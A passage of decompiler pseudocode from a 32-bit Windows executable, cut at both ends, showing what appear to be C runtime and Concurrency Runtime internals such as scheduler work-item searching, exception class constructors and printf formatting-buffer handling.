  if ( sub_442B33((_DWORD *)this, a2) )
    return 1;
  TickCount64 = j____crtGetTickCount64();
  v9 = *(_DWORD *)(this + 4);
  *(_QWORD *)(this + 16) = TickCount64;
  sub_442AFA(v9, TickCount64);
  if ( sub_4426BB((_QWORD *)this, *(_QWORD *)(this + 16)) )
  {
    v10 = *(_DWORD *)(this + 4);
    if ( *(_DWORD *)(v10 + 304) )
    {
      while ( 1 )
      {
        v12 = (_DWORD *)sub_436156(v10);
        if ( !v12 )
          break;
        if ( *v12 )
        {
          if ( (a5 & 1) != 0 )
          {
            v11 = sub_443A7E(v12 - 53);
            if ( v11 )
            {
              v13 = sub_4425BD(v25, v11);
              *a2 = *v13;
              a2[1] = v13[1];
              a2[2] = v13[2];
              v5 = a2;
LABEL_15:
              v33 = 1;
              break;
            }
          }
        }
        else if ( sub_442BDC(v12 - 68, a2, a4, a5) )
        {
          goto LABEL_15;
        }
        v10 = *(_DWORD *)(this + 4);
      }
    }
    *(_BYTE *)(*(_DWORD *)this + 98) = 1;
  }
  v14 = *(_DWORD *)this;
  v30 = *(_DWORD **)(*(_DWORD *)this + 84);
  if ( v33 )
  {
LABEL_44:
    v23 = (_DWORD *)v5[1];
    v24 = (_DWORD *)v23[2];
    sub_4438F5(v23, *(_DWORD *)(this + 16), *(_DWORD *)(this + 20));
    sub_43D5B5(*(_DWORD *)this, (*(_DWORD *)(v5[1] + 12) & 0xFFFFFFF) == 0, v24 == v30);
  }
  else
  {
    v15 = !*(_BYTE *)(v14 + 96) && !sub_43CB4E(v14) && !a4;
    v16 = v33;
    LOBYTE(v28) = 1;
    while ( v15 <= 2 )
    {
      v17 = (int *)a3;
      v29 = dword_471A0C[v15];
      v18 = v30;
      v31 = (int *)a3;
      v32 = v30;
      if ( v30 )
      {
        v19 = a5 & 0x14;
        v26 = v19;
        while ( 1 )
        {
          if ( v19 )
          {
            if ( sub_443428(this, v5, v18, (int)v17, (a5 & 4) != 0, v29, a5, a4) )
              break;
            v18 = v32;
            v17 = v31;
          }
          if ( (a5 & 0xA) != 0 && sub_44321E(this, v5, v18, v17, (a5 & 2) != 0, v29, a5, a4) )
            break;
          v20 = a5 & 1;
          v27 = v20;
          if ( (a5 & 1) != 0 )
          {
            if ( sub_44331A(this, v5, v32, (int)v31, v28, v29, a5, a4)
              || v15 == 2 && sub_443A0F(this, v5, (_DWORD *)v32[1], *(int **)this) )
            {
              break;
            }
            v20 = v27;
          }
          if ( (_BYTE)v28 && v20 && sub_4426F1((_DWORD *)this, v5, *(int **)this, 1) )
            break;
          v21 = *(_DWORD **)(this + 4);
          LOBYTE(v28) = 0;
          v31 = 0;
          v22 = sub_4361C7(v21, (int)v30, (int)v32);
          v17 = v31;
          v18 = (_DWORD *)v22;
          v19 = v26;
          v32 = v18;
          if ( !v18 )
          {
            v16 = v33;
            goto LABEL_42;
          }
        }
        v33 = 1;
        goto LABEL_44;
      }
LABEL_42:
      ++v15;
      if ( v16 )
      {
        v33 = v16;
        goto LABEL_44;
      }
    }
  }
  return v33;
}
// 43001E: using guessed type __int64 j____crtGetTickCount64(void);
// 471A0C: using guessed type int dword_471A0C[3];
// 442FC0: using guessed type int var_2C[3];

//----- (0044321E) --------------------------------------------------------
char __thiscall sub_44321E(int this, int *a2, _DWORD *a3, int *a4, char a5, int a6, char a7, char a8)
{
  int v8; // eax
  int *v9; // ebx
  int *v10; // eax
  int i; // [esp+Ch] [ebp-Ch]
  int v14; // [esp+14h] [ebp-4h] BYREF

  if ( !a4 || !sub_44289D((_DWORD *)this, a2, a4, a5, a6, a8) )
  {
    if ( a6 )
      v8 = sub_4427CD(a3, &v14);
    else
      v8 = sub_442808(a3, &v14);
    v9 = (int *)v8;
    for ( i = v14; ; v9 = (int *)sub_43618B(&v14, i, (_DWORD *)((char *)a3 + (a6 != 0 ? 16 : 96))) )
    {
      if ( !v9 )
        return 0;
      v10 = (int *)sub_4425E3(*(_DWORD **)(this + 4), *(_DWORD *)(this + 8));
      if ( v10 && sub_442B6F(v10, a2, a8, a7) )
        return 1;
      if ( !sub_443941((_DWORD *)this, (int)v9, (int)a4, a6, a8) && sub_442846(a2, v9, a5) )
        break;
    }
    if ( a6 )
      a3[44] = (v14 + 1) % a3[20];
    else
      a3[45] = (v14 + 1) % a3[40];
  }
  return 1;
}

//----- (0044331A) --------------------------------------------------------
char __thiscall sub_44331A(int this, int *a2, _DWORD *a3, int a4, char a5, int a6, char a7, char a8)
{
  int v9; // eax
  int *v10; // eax
  int i; // [esp+Ch] [ebp-Ch]
  int v13; // [esp+10h] [ebp-8h]
  int v14; // [esp+14h] [ebp-4h] BYREF

  if ( (!a4 || !sub_44295B((_DWORD *)this, a2, a4, a6, a8))
    && (!a5 || !sub_443A0F(this, a2, *(_DWORD **)(*(_DWORD *)this + 80), *(int **)this)) )
  {
    if ( a6 )
      v9 = sub_4427CD(a3, &v14);
    else
      v9 = sub_442808(a3, &v14);
    for ( i = v14; ; v9 = sub_43618B(&v14, i, (_DWORD *)((char *)a3 + (a6 != 0 ? 16 : 96))) )
    {
      v13 = v9;
      if ( !v9 )
        return 0;
      v10 = (int *)sub_4425E3(*(_DWORD **)(this + 4), *(_DWORD *)(this + 8));
      if ( v10 && sub_442B6F(v10, a2, a8, a7) )
        return 1;
      if ( !sub_443941((_DWORD *)this, v13, a4, a6, a8) && sub_44291E(a2, v13) )
        break;
    }
    if ( a6 )
      a3[44] = (v14 + 1) % a3[20];
    else
      a3[45] = (v14 + 1) % a3[40];
  }
  return 1;
}

//----- (00443428) --------------------------------------------------------
char __thiscall sub_443428(int this, int *a2, _DWORD *a3, int a4, char a5, int a6, char a7, char a8)
{
  int v8; // eax
  int v9; // ebx
  int *v10; // eax
  int i; // [esp+Ch] [ebp-Ch]
  int v14; // [esp+14h] [ebp-4h] BYREF

  if ( !a4 || !sub_442A29((_DWORD *)this, a2, a4, a5, a6, a8) )
  {
    if ( a6 )
      v8 = sub_4427CD(a3, &v14);
    else
      v8 = sub_442808(a3, &v14);
    v9 = v8;
    for ( i = v14; ; v9 = sub_43618B(&v14, i, (_DWORD *)((char *)a3 + (a6 != 0 ? 16 : 96))) )
    {
      if ( !v9 )
        return 0;
      v10 = (int *)sub_4425E3(*(_DWORD **)(this + 4), *(_DWORD *)(this + 8));
      if ( v10 && sub_442B6F(v10, a2, a8, a7) )
        return 1;
      if ( !sub_443941((_DWORD *)this, v9, a4, a6, a8) && sub_4429D6(a2, v9, a8, a5) )
        break;
    }
    if ( a6 )
      a3[44] = (v14 + 1) % a3[20];
    else
      a3[45] = (v14 + 1) % a3[40];
  }
  return 1;
}

//----- (00443527) --------------------------------------------------------
char __thiscall sub_443527(int this, int *a2, int a3, int a4, unsigned int a5)
{
  char v6; // bl
  int v8; // esi
  unsigned int v9; // eax
  _DWORD *v10; // eax
  char v11; // al
  _DWORD *v12; // ecx
  _DWORD *v13; // ecx
  unsigned int v14; // eax
  char v15; // al
  _DWORD *v16; // ecx
  unsigned int v17; // eax
  char v18; // al
  int v19; // [esp-8h] [ebp-18h]
  char v20; // [esp+8h] [ebp-8h]
  char v21; // [esp+8h] [ebp-8h]
  int v22; // [esp+Ch] [ebp-4h]
  int v23; // [esp+Ch] [ebp-4h]
  int v24; // [esp+Ch] [ebp-4h]

  v6 = 0;
  if ( sub_442B33((_DWORD *)this, a2) )
    return 1;
  v8 = sub_4361F0(*(_DWORD **)(this + 4));
  v9 = a5;
  if ( (a5 & 1) == 0 )
  {
LABEL_9:
    if ( (v9 & 0xA) != 0 && (v13 = (_DWORD *)v8, (v23 = v8) != 0) )
    {
      v14 = (v9 >> 1) & 0xFFFFFF01;
      v20 = v14;
      while ( 1 )
      {
        v15 = sub_443748(a2, v13, v14);
        v12 = *(_DWORD **)(this + 4);
        v6 = v15;
        v19 = v23;
        if ( v15 )
          break;
        v13 = (_DWORD *)sub_4361C7(v12, v8, v23);
        v23 = (int)v13;
        LOBYTE(v14) = v20;
        if ( !v13 )
        {
          v9 = a5;
          goto LABEL_15;
        }
      }
    }
    else
    {
LABEL_15:
      if ( (v9 & 0x14) == 0 )
        return v6;
      v16 = (_DWORD *)v8;
      v24 = v8;
      if ( !v8 )
        return v6;
      v17 = (v9 >> 2) & 0xFFFFFF01;
      v21 = v17;
      while ( 1 )
      {
        v18 = sub_44385D(a2, v16, v17);
        v12 = *(_DWORD **)(this + 4);
        v6 = v18;
        v19 = v24;
        if ( v18 )
          break;
        v16 = (_DWORD *)sub_4361C7(v12, v8, v24);
        v24 = (int)v16;
        LOBYTE(v17) = v21;
        if ( !v16 )
          return v6;
      }
    }
    goto LABEL_21;
  }
  v22 = v8;
  v10 = (_DWORD *)v8;
  if ( v8 )
  {
    while ( 1 )
    {
      v11 = sub_4437DC(a2, v10);
      v12 = *(_DWORD **)(this + 4);
      v6 = v11;
      v19 = v22;
      if ( v11 )
        break;
      v10 = (_DWORD *)sub_4361C7(v12, v8, v22);
      v22 = (int)v10;
      if ( !v10 )
        goto LABEL_7;
    }
LABEL_21:
    sub_4378EC(v12, v19);
    return v6;
  }
LABEL_7:
  v6 = sub_4439CD((_DWORD **)this, a2, *(_DWORD **)(*(_DWORD *)this + 80));
  if ( !v6 )
  {
    v9 = a5;
    goto LABEL_9;
  }
  return v6;
}

//----- (0044363A) --------------------------------------------------------
char __thiscall sub_44363A(int this, int *a2, int a3, int a4, unsigned int a5)
{
  char v6; // bl
  int v8; // eax
  int v9; // esi
  _DWORD *v10; // ecx
  unsigned int v11; // eax
  char v12; // al
  _DWORD *v13; // ecx
  _DWORD *v14; // ecx
  unsigned int v15; // eax
  char v16; // al
  _DWORD *v17; // eax
  char v18; // al
  int v19; // [esp-8h] [ebp-18h]
  char v20; // [esp+8h] [ebp-8h]
  char v21; // [esp+8h] [ebp-8h]
  int v22; // [esp+Ch] [ebp-4h]
  int v23; // [esp+Ch] [ebp-4h]
  int v24; // [esp+Ch] [ebp-4h]

  v6 = 0;
  if ( sub_442B33((_DWORD *)this, a2) )
    return 1;
  v8 = sub_4361F0(*(_DWORD **)(this + 4));
  v9 = v8;
  if ( (a5 & 0x14) != 0 )
  {
    v10 = (_DWORD *)v8;
    v22 = v8;
    if ( v8 )
    {
      v11 = (a5 >> 2) & 0xFFFFFF01;
      v20 = v11;
      do
      {
        v12 = sub_44385D(a2, v10, v11);
        v13 = *(_DWORD **)(this + 4);
        v6 = v12;
        v19 = v22;
        if ( v12 )
          goto LABEL_19;
        v10 = (_DWORD *)sub_4361C7(v13, v9, v22);
        v22 = (int)v10;
        LOBYTE(v11) = v20;
      }
      while ( v10 );
    }
  }
  if ( (a5 & 0xA) != 0 )
  {
    v14 = (_DWORD *)v9;
    v23 = v9;
    if ( v9 )
    {
      v15 = (a5 >> 1) & 0xFFFFFF01;
      v21 = v15;
      do
      {
        v16 = sub_443748(a2, v14, v15);
        v13 = *(_DWORD **)(this + 4);
        v6 = v16;
        v19 = v23;
        if ( v16 )
          goto LABEL_19;
        v14 = (_DWORD *)sub_4361C7(v13, v9, v23);
        v23 = (int)v14;
        LOBYTE(v15) = v21;
      }
      while ( v14 );
    }
  }
  if ( (a5 & 1) != 0 )
  {
    v24 = v9;
    v17 = (_DWORD *)v9;
    if ( v9 )
    {
      while ( 1 )
      {
        v18 = sub_4437DC(a2, v17);
        v13 = *(_DWORD **)(this + 4);
        v6 = v18;
        v19 = v24;
        if ( v18 )
          break;
        v17 = (_DWORD *)sub_4361C7(v13, v9, v24);
        v24 = (int)v17;
        if ( !v17 )
          return sub_4439CD((_DWORD **)this, a2, *(_DWORD **)(*(_DWORD *)this + 80));
      }
LABEL_19:
      sub_4378EC(v13, v19);
      return v6;
    }
    return sub_4439CD((_DWORD **)this, a2, *(_DWORD **)(*(_DWORD *)this + 80));
  }
  return v6;
}

//----- (00443748) --------------------------------------------------------
char __stdcall sub_443748(int *a1, _DWORD *a2, char a3)
{
  int *v3; // esi
  int v4; // eax
  char result; // al
  int v6; // [esp+Ch] [ebp-14h]
  int v7; // [esp+14h] [ebp-Ch]
  int v8; // [esp+18h] [ebp-8h]
  int v9; // [esp+1Ch] [ebp-4h] BYREF

  v3 = (int *)sub_442808(a2, &v9);
  v8 = v9;
  while ( v3 )
  {
    if ( a3 )
    {
      v4 = sub_44023D(v3);
      if ( v4 )
      {
        v6 = 2;
        v7 = v4;
LABEL_5:
        result = 1;
        a2[45] = (v9 + 1) % a2[40];
        *a1 = v6;
        a1[1] = (int)v3;
        a1[2] = v7;
        return result;
      }
    }
    else if ( sub_440297(v3) )
    {
      v6 = 8;
      goto LABEL_5;
    }
    v3 = (int *)sub_43618B(&v9, v8, a2 + 24);
  }
  return 0;
}
// 4437A6: variable 'v7' is possibly undefined

//----- (004437DC) --------------------------------------------------------
char __stdcall sub_4437DC(_DWORD *a1, _DWORD *a2)
{
  int v2; // edi
  int v3; // esi
  char result; // al
  _DWORD *v5; // esi
  int v6[3]; // [esp+Ch] [ebp-14h] BYREF
  int i; // [esp+18h] [ebp-8h]
  int v8; // [esp+1Ch] [ebp-4h] BYREF

  v2 = sub_442808(a2, &v8);
  for ( i = v8; ; v2 = sub_43618B(&v8, i, a2 + 24) )
  {
    if ( !v2 )
      return 0;
    v3 = (*(int (__thiscall **)(int))(*(_DWORD *)v2 + 12))(v2);
    if ( v3 )
      break;
  }
  a2[45] = (v8 + 1) % a2[40];
  v5 = sub_4425BD(v6, v3);
  result = 1;
  *a1 = *v5++;
  a1[1] = *v5;
  a1[2] = v5[1];
  return result;
}
// 4437DC: using guessed type int var_14[3];

//----- (0044385D) --------------------------------------------------------
char __stdcall sub_44385D(int *a1, _DWORD *a2, char a3)
{
  int v3; // esi
  void *v4; // ebx
  char result; // al
  int v6; // [esp+Ch] [ebp-14h]
  int v7; // [esp+18h] [ebp-8h]
  int v8; // [esp+1Ch] [ebp-4h] BYREF

  v3 = sub_442808(a2, &v8);
  v7 = v8;
  while ( v3 )
  {
    if ( a3 )
    {
      v4 = sub_4408DA(v3, 0);
      if ( v4 )
      {
        v6 = 4;
LABEL_5:
        result = 1;
        a2[45] = (v8 + 1) % a2[40];
        *a1 = v6;
        a1[1] = v3;
        a1[2] = (int)v4;
        return result;
      }
    }
    else
    {
      v4 = sub_4404A1(v3);
      if ( v4 )
      {
        v6 = 16;
        goto LABEL_5;
      }
    }
    v3 = sub_43618B(&v8, v7, a2 + 24);
  }
  return 0;
}

//----- (004438F5) --------------------------------------------------------
unsigned int __thiscall sub_4438F5(_DWORD *this, int a2, unsigned int a3)
{
  unsigned int result; // eax

  result = a2 - this[66];
  if ( result > 0x64 )
  {
    result = a3;
    this[66] = a2;
    this[67] = a3;
  }
  return result;
}

//----- (0044391B) --------------------------------------------------------
unsigned int __thiscall sub_44391B(_DWORD *this, int a2, unsigned int a3)
{
  unsigned int result; // eax

  result = a2 - this[50];
  if ( result > 0x64 )
  {
    result = a3;
    this[50] = a2;
    this[51] = a3;
  }
  return result;
}

//----- (00443941) --------------------------------------------------------
bool __thiscall sub_443941(_DWORD *this, int a2, int a3, int a4, char a5)
{
  _DWORD *v7; // edx
  char v8; // bl
  bool v9; // zf

  if ( a2 == a3 )
    return 1;
  v7 = (_DWORD *)(a2 + 12);
  v8 = 0;
  switch ( a4 )
  {
    case 0:
      return (*v7 & 0xFFFFFFF) != 0;
    case 1:
      if ( (*v7 & 0xFFFFFFF) == 0 )
        return 1;
      v9 = !sub_442571((_DWORD *)(*this + 148), (_DWORD *)(a2 + 12));
      break;
    case 2:
      if ( (*v7 & 0xFFFFFFF) == 0 || sub_442571((_DWORD *)(*this + 148), (_DWORD *)(a2 + 12)) )
        return 1;
      if ( !sub_436B00((_DWORD *)(this[1] + 60), a2 + 28) )
        return v8;
      v9 = a5 == 0;
      break;
    default:
      return v8;
  }
  if ( v9 )
    return 1;
  return v8;
}

//----- (004439CD) --------------------------------------------------------
char __thiscall sub_4439CD(_DWORD **this, _DWORD *a2, _DWORD *a3)
{
  _DWORD *i; // eax
  int v6; // [esp+4h] [ebp-4h] BYREF

  v6 = 0;
  for ( i = (_DWORD *)sub_442780(this[1], &v6, -1); ; i = (_DWORD *)sub_442780(this[1], &v6, 0) )
  {
    if ( !i )
      return 0;
    if ( i != a3 && sub_443A0F((int)this, a2, i, 0) )
      break;
  }
  return 1;
}

//----- (00443A0F) --------------------------------------------------------
char __thiscall sub_443A0F(int this, _DWORD *a2, _DWORD *a3, int *a4)
{
  int *i; // eax
  __int32 v6; // eax
  int *v7; // esi
  char result; // al
  _DWORD *v9; // esi
  int v10[3]; // [esp+Ch] [ebp-10h] BYREF
  int v11; // [esp+18h] [ebp-4h] BYREF

  for ( i = (int *)sub_435C25(a3, 0, a3[30], &v11); ; i = (int *)sub_436233(a3, &v11, 0) )
  {
    v7 = i;
    if ( !i )
      return 0;
    if ( i != a4 )
    {
      sub_44391B(i, *(_DWORD *)(this + 16), *(_DWORD *)(this + 20));
      v6 = sub_443A7E(v7);
      if ( v6 )
        break;
    }
  }
  v9 = sub_4425BD(v10, v6);
  result = 1;
  *a2 = *v9++;
  a2[1] = *v9;
  a2[2] = v9[1];
  return result;
}
// 443A0F: using guessed type int var_10[3];

//----- (00443A7E) --------------------------------------------------------
__int32 __thiscall sub_443A7E(int *this)
{
  int v1; // eax
  int *v2; // ecx
  int v3; // edx

  v1 = this[5];
  v2 = this + 4;
  v3 = 0;
  if ( v1 > *v2 )
    return sub_43DB6C(v2, 0);
  return v3;
}

//----- (00443A95) --------------------------------------------------------
void __thiscall sub_443A95(_DWORD *this, _DWORD *a2)
{
  int v3; // eax
  int v4; // edx
  void *v5; // eax

  v3 = sub_41DA9B(a2 + 1);
  v4 = this[1];
  v5 = *(void **)(v3 + 256);
  if ( *this == 2 )
  {
    if ( v5 == *(void **)(v4 + 256) )
      sub_436AC6(v5);
    else
      sub_43ED6F(a2, v4, 0);
  }
  else if ( v5 != *(void **)(v4 + 256) )
  {
    sub_43ED6F(a2, v4, 1);
  }
}

//----- (00443AE2) --------------------------------------------------------
int __thiscall sub_443AE2(int this)
{
  return (*(int (__cdecl **)(_DWORD))(this + 4))(*(_DWORD *)(this + 8));
}

//----- (00443AF6) --------------------------------------------------------
_DWORD *__thiscall sub_443AF6(_DWORD *this, int a2, int a3)
{
  sub_43C9EB(this);
  *this = &Concurrency::details::ThreadVirtualProcessor::`vftable';
  sub_43CD94((int)this, a2, a3);
  return this;
}
// 471A1C: using guessed type void *Concurrency::details::ThreadVirtualProcessor::`vftable';

//----- (00443B2D) --------------------------------------------------------
_DWORD *__thiscall sub_443B2D(_DWORD *Block, char a2)
{
  *Block = &Concurrency::details::ThreadVirtualProcessor::`vftable';
  sub_43CA4B(Block);
  if ( (a2 & 1) != 0 )
    sub_42CF7C(Block);
  return Block;
}
// 471A1C: using guessed type void *Concurrency::details::ThreadVirtualProcessor::`vftable';

//----- (0044413F) --------------------------------------------------------
int sub_44413F()
{
  return dword_4928DC;
}
// 4928DC: using guessed type int dword_4928DC;

//----- (00444161) --------------------------------------------------------
void *__cdecl sub_444161(size_t Size)
{
  return malloc(Size);
}

//----- (00445E3A) --------------------------------------------------------
std::exception *__thiscall sub_445E3A(std::exception *this, struct std::exception *a2)
{
  std::exception::exception(this, a2);
  *(_DWORD *)this = &std::__non_rtti_object::`vftable';
  return this;
}
// 471A54: using guessed type void *std::__non_rtti_object::`vftable';

//----- (00445E55) --------------------------------------------------------
std::exception *__thiscall sub_445E55(std::exception *this, struct std::exception *a2)
{
  std::exception::exception(this, a2);
  *(_DWORD *)this = &std::bad_typeid::`vftable';
  return this;
}
// 471A48: using guessed type void *std::bad_typeid::`vftable';

//----- (00446213) --------------------------------------------------------
_DWORD *__cdecl sub_446213(_DWORD *a1, int a2)
{
  _DWORD *result; // eax

  result = a1;
  a1[1] = 0;
  a1[2] = 0;
  a1[1] = a2;
  *a1 = &std::__non_rtti_object::`vftable';
  return result;
}
// 471A54: using guessed type void *std::__non_rtti_object::`vftable';

//----- (0044622F) --------------------------------------------------------
_DWORD *__cdecl sub_44622F(_DWORD *a1, int a2)
{
  _DWORD *result; // eax

  result = a1;
  a1[1] = 0;
  a1[2] = 0;
  a1[1] = a2;
  *a1 = &std::bad_cast::`vftable';
  return result;
}
// 46C9D4: using guessed type void *std::bad_cast::`vftable';

//----- (00446FFC) --------------------------------------------------------
std::exception *__thiscall sub_446FFC(std::exception *this, struct std::exception *a2)
{
  std::exception::exception(this, a2);
  *(_DWORD *)this = &std::bad_exception::`vftable';
  return this;
}
// 471A98: using guessed type void *std::bad_exception::`vftable';

//----- (00447017) --------------------------------------------------------
_DWORD *__thiscall sub_447017(_DWORD *this)
{
  _DWORD *result; // eax

  this[1] = 0;
  result = this;
  this[2] = 0;
  this[1] = "bad exception";
  *this = &std::bad_exception::`vftable';
  return result;
}
// 471A98: using guessed type void *std::bad_exception::`vftable';

//----- (0044751C) --------------------------------------------------------
int __thiscall sub_44751C(int this, char *a2, int a3)
{
  int v4; // eax

  v4 = 0;
  *(_DWORD *)this = 0;
  *(_DWORD *)(this + 4) = 0;
  if ( a2 && *a2 )
  {
    do
      ++v4;
    while ( a2[v4] );
    if ( v4 )
      sub_44763B((_BYTE *)this, a2, v4);
  }
  return this;
}

//----- (0044763B) --------------------------------------------------------
void __thiscall sub_44763B(_BYTE *this, char *a2, int a3)
{
  _BYTE *MemoryWithBuffer; // eax
  char v5; // cl
  int v6; // [esp+8h] [ebp-4h]

  if ( !a2 || a3 <= 0 )
  {
    this[4] = 2;
    return;
  }
  if ( a3 == 1 )
  {
    MemoryWithBuffer = _HeapManager::getMemoryWithBuffer((_HeapManager *)&dword_492908, 8u);
    if ( MemoryWithBuffer )
    {
      v5 = *a2;
      *(_DWORD *)MemoryWithBuffer = &charNode::`vftable';
      MemoryWithBuffer[4] = v5;
      goto LABEL_9;
    }
  }
  else if ( _HeapManager::getMemoryWithBuffer((_HeapManager *)&dword_492908, 0xCu) )
  {
    LOBYTE(v6) = 0;
    MemoryWithBuffer = (_BYTE *)unknown_libname_51(a2, a3, v6);
    goto LABEL_9;
  }
  MemoryWithBuffer = 0;
LABEL_9:
  *(_DWORD *)this = MemoryWithBuffer;
  if ( !MemoryWithBuffer )
    this[4] = 3;
}
// 447675: variable 'v6' is possibly undefined
// 472844: using guessed type void *charNode::`vftable';
// 492908: using guessed type int dword_492908;

//----- (0044D8EF) --------------------------------------------------------
int __cdecl sub_44D8EF(int a1)
{
  return unknown_libname_56(a1);
}
// 44D783: using guessed type _DWORD __stdcall unknown_libname_56(_DWORD);

//----- (0044DC4F) --------------------------------------------------------
int sub_44DC4F()
{
  return common_flush_all(1);
}
// 44DC58: using guessed type _DWORD __cdecl common_flush_all(_DWORD);

//----- (0044E3CE) --------------------------------------------------------
int __cdecl sub_44E3CE(int a1, int a2)
{
  int v3; // [esp+0h] [ebp-Ch] BYREF
  int v4; // [esp+4h] [ebp-8h] BYREF

  v4 = a1;
  v3 = a1;
  return __crt_seh_guarded_call<unsigned int>::operator()<_lambda_11b4f7b0d3157825a5656a18eba1ae27_,_lambda_b51c0495177f500e782686251704ae76_ &,_lambda_cf89b47920b5017557bfe891e78aca36_>(
           &v3,
           a2,
           &v4);
}
// 44E37D: using guessed type _DWORD __stdcall __crt_seh_guarded_call<unsigned int>::operator()<_lambda_11b4f7b0d3157825a5656a18eba1ae27_,_lambda_b51c0495177f500e782686251704ae76_ &,_lambda_cf89b47920b5017557bfe891e78aca36_>(_DWORD, _DWORD, _DWORD);
// 44E3CE: using guessed type int var_8;

//----- (0044E6B9) --------------------------------------------------------
int __cdecl sub_44E6B9(int a1, int a2)
{
  int v3; // [esp+0h] [ebp-Ch] BYREF
  int v4; // [esp+4h] [ebp-8h] BYREF

  v4 = a1;
  v3 = a1;
  return __crt_seh_guarded_call<unsigned int>::operator()<_lambda_11b4f7b0d3157825a5656a18eba1ae27_,_lambda_b51c0495177f500e782686251704ae76_ &,_lambda_cf89b47920b5017557bfe891e78aca36_>(
           &v3,
           a2,
           &v4);
}
// 44E668: using guessed type _DWORD __stdcall __crt_seh_guarded_call<unsigned int>::operator()<_lambda_11b4f7b0d3157825a5656a18eba1ae27_,_lambda_b51c0495177f500e782686251704ae76_ &,_lambda_cf89b47920b5017557bfe891e78aca36_>(_DWORD, _DWORD, _DWORD);
// 44E6B9: using guessed type int var_8;

//----- (0044F077) --------------------------------------------------------
int __cdecl sub_44F077(int a1, int a2)
{
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  savedregs = (int)&savedregs;
  return unknown_libname_58(a1, a2, 0);
}
// 44F099: using guessed type _DWORD __cdecl unknown_libname_58(_DWORD, _DWORD, _DWORD);

//----- (00451898) --------------------------------------------------------
int __cdecl sub_451898(int a1)
{
  return unknown_libname_56(a1);
}
// 44D783: using guessed type _DWORD __stdcall unknown_libname_56(_DWORD);

//----- (00451F26) --------------------------------------------------------
int __cdecl sub_451F26(int a1, int a2, int *a3, unsigned int a4, int a5, struct __crt_locale_pointers *a6, int a7)
{
  int *v8; // edi
  int v9; // esi
  int v10; // eax
  int v11; // [esp+4h] [ebp-484h] BYREF
  char v12[12]; // [esp+8h] [ebp-480h] BYREF
  int v13; // [esp+14h] [ebp-474h]
  int v14[2]; // [esp+18h] [ebp-470h] BYREF
  int v15; // [esp+20h] [ebp-468h]
  int v16; // [esp+24h] [ebp-464h]
  int *v17; // [esp+28h] [ebp-460h] BYREF
  char v18[64]; // [esp+2Ch] [ebp-45Ch] BYREF
  char v19[1048]; // [esp+6Ch] [ebp-41Ch] BYREF

  v17 = a3;
  if ( !a5 || a4 && !a3 )
  {
    *_errno() = 22;
    _invalid_parameter_noinfo();
    return -1;
  }
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&v11, a6);
  v16 = 0;
  v8 = v17;
  v13 = a1 & 2;
  v14[0] = (int)v17;
  v14[1] = a4;
  v15 = 0;
  if ( (a1 & 2) != 0 || (LOBYTE(v16) = 0, !v17) )
    LOBYTE(v16) = 1;
  v17 = v14;
  unknown_libname_65(&v17, a1, a2, a5, v12, a7);
  v9 = sub_452579((int)v18);
  if ( !v8 )
    goto LABEL_22;
  if ( (a1 & 1) == 0 )
  {
    if ( v13 )
    {
      if ( !a4 )
        goto LABEL_22;
      if ( v9 < 0 )
      {
        *(_BYTE *)v8 = 0;
        goto LABEL_22;
      }
      v10 = v15;
      if ( v15 != a4 )
      {
LABEL_21:
        *((_BYTE *)v8 + v10) = 0;
        goto LABEL_22;
      }
    }
    else
    {
      if ( !a4 )
      {
LABEL_26:
        v9 = -1;
        goto LABEL_22;
      }
      v10 = v15;
      if ( v15 != a4 )
        goto LABEL_21;
      v9 = -2;
    }
    *((_BYTE *)v8 + a4 - 1) = 0;
    goto LABEL_22;
  }
  if ( !a4 && v9 )
    goto LABEL_26;
  v10 = v15;
  if ( v15 != a4 )
    goto LABEL_21;
  if ( v9 >= 0 && v9 > a4 )
    goto LABEL_26;
LABEL_22:
  __crt_stdio_output::formatting_buffer::~formatting_buffer((__crt_stdio_output::formatting_buffer *)v19);
  if ( v12[8] )
    *(_DWORD *)(v11 + 848) &= ~2u;
  return v9;
}
// 4523C2: using guessed type _DWORD __stdcall unknown_libname_65(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 451F26: using guessed type char var_45C[64];
// 451F26: using guessed type char var_41C[1048];

//----- (00452579) --------------------------------------------------------
int __thiscall sub_452579(int this)
{
  int v3; // eax
  char v4; // al
  char v5; // al

  if ( !(unsigned __int8)unknown_libname_61(this + 1096) )
    return -1;
  if ( *(_DWORD *)(this + 16) )
  {
    while ( ++*(_DWORD *)(this + 1104) != 2 )
    {
      *(_DWORD *)(this + 56) = 0;
      *(_DWORD *)(this + 28) = 0;
      while ( 1 )
      {
        v5 = **(_BYTE **)(this + 16);
        *(_BYTE *)(this + 49) = v5;
        if ( !v5 )
          break;
        ++*(_DWORD *)(this + 16);
        if ( *(int *)(this + 24) < 0 )
          goto LABEL_21;
        v3 = unknown_libname_67(*(_BYTE *)(this + 49), *(_DWORD *)(this + 28));
        *(_DWORD *)(this + 28) = v3;
        if ( v3 == 8 )
          goto LABEL_4;
        switch ( v3 )
        {
          case 0:
            v4 = sub_4526DE((char *)this);
            break;
          case 1:
            *(_DWORD *)(this + 40) = -1;
            *(_DWORD *)(this + 36) = 0;
            *(_BYTE *)(this + 48) = 0;
            *(_DWORD *)(this + 32) = 0;
            *(_DWORD *)(this + 44) = 0;
            *(_BYTE *)(this + 60) = 0;
            continue;
          case 2:
            v4 = unknown_libname_69(this);
            break;
          case 3:
            v4 = sub_452B48(this);
            break;
          case 4:
            *(_DWORD *)(this + 40) = 0;
            continue;
          case 5:
            v4 = sub_452788(this);
            break;
          case 6:
            v4 = sub_4527B0((_BYTE *)this);
            break;
          case 7:
            v4 = sub_452919(this);
            break;
          default:
            return -1;
        }
        if ( !v4 )
          return -1;
      }
      ++*(_DWORD *)(this + 16);
LABEL_21:
      if ( !(unsigned __int8)unknown_libname_76(this) )
        return -1;
    }
    return *(_DWORD *)(this + 24);
  }
  else
  {
LABEL_4:
    *_errno() = 22;
    _invalid_parameter_noinfo();
    return -1;
  }
}
// 451EC2: using guessed type int __thiscall unknown_libname_61(_DWORD);
// 45248C: using guessed type _DWORD __stdcall unknown_libname_67(char, _DWORD);
// 4526A1: using guessed type int __thiscall unknown_libname_69(_DWORD);
// 453084: using guessed type int __thiscall unknown_libname_76(_DWORD);

//----- (004526DE) --------------------------------------------------------
char __thiscall sub_4526DE(char *this)
{
  if ( sub_4526FD(this) )
    return 1;
  *_errno() = 22;
  _invalid_parameter_noinfo();
  return 0;
}

//----- (004526FD) --------------------------------------------------------
char __thiscall sub_4526FD(char *this)
{
  char result; // al

